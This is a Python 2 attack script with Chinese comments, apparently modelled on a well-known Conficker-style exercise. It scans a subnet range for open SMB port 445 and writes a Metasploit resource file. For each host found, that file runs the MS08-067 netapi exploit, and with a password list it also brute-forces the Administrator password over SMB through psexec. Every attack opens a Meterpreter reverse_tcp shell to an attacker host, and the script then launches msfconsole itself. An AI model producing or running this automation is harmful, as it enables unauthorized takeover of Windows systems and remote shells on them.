#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import optparse
import sys
import nmap

#获得目标主机数组(开放了445的主机)
def findTgts(host):
    tgtHosts = []
    tgthost=host.split('.')
    subnet=tgthost[0]+'.'+tgthost[1]+'.'+tgthost[2]+'.'
    for num in range(128,133):
        try:
            host=subnet+str(num)
            nmScan = nmap.PortScanner()
            nmScan.scan(host, '445')
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
        except Exception,e:
            print '[!]'+host+' ERROR: '+str(e)
    # print len(tgtHosts)
    return tgtHosts

# def findTgts(subNet):
#     nmScan = nmap.PortScanner()
#     nmScan.scan(subNet, '445')
#     tgtHosts = []
#     for host in nmScan.all_hosts():
#         if nmScan[host].has_tcp(445):
#             state = nmScan[host]['tcp'][445]['state']
#             if state == 'open':
#                 print '[+] Found Target Host: ' + host
#                 tgtHosts.append(host)
#     return tgtHosts

#监听器 
# def setupHandler(configFile, lhost, lport):
#     configFile.write('use exploit/multi/handler\n')
#     configFile.write('set payload '+\
#       'windows/meterpreter/reverse_tcp\n')
#     configFile.write('set LPORT ' + str(lport) + '\n')
#     configFile.write('set LHOST ' + lhost + '\n')
#     configFile.write('exploit -j -z\n')
#     configFile.write('setg DisablePayloadHandler 1\n')

#写入用户生成漏洞利用代码的信息
def confickerExploit(configFile,tgtHost,lhost,lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload '+\
      'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')

#爆破SMB口令，远程执行进程
def smbBrute(configFile,tgtHost,passwdFile,lhost,lport='7777'):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set payload '+\
          'windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')

#写好rc脚本-->运行msf执行攻击
def main():
    #打开一个rc文件
    configFile = open('meta.rc', 'w')

    parser = optparse.OptionParser('[-] Usage %prog '+\
      '-H <RHOST[s]> -l <LHOST> -p <LPORT> [-F <Password File>]')
    parser.add_option('-H', dest='tgtHost', type='string',\
      help='specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string',\
      help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string',\
      help='specify the listen address')
    parser.add_option('-F', dest='passwdFile', type='string',\
      help='password file for SMB brute force attempt')

    (options, args) = parser.parse_args()

    if (options.tgtHost == None) | (options.lhost == None) | (options.lport == None):
        print parser.usage
        exit(0)

    lhost = options.lhost
    lport = options.lport
    # if lport == None:
    #     # lport = '1337'
    passwdFile = options.passwdFile
    tgtHosts = findTgts(options.tgtHost)

    num_host=len(tgtHosts)
    lports=[]
    for i in range(0,num_host):
        local_port=int(lport)+i
        lports.append(str(local_port))

    # setupHandler(configFile, lhost, lport)

    for i in range(0,num_host):
        tgtHost=tgtHosts[i]
        lport=lports[i]
        confickerExploit(configFile, tgtHost, lhost, lport)
        if passwdFile != None:
            smbBrute(configFile,tgtHost,passwdFile,lhost)

    configFile.close()
    #运行msf
    os.system('msfconsole -r meta.rc')
if __name__ == '__main__':
    main()
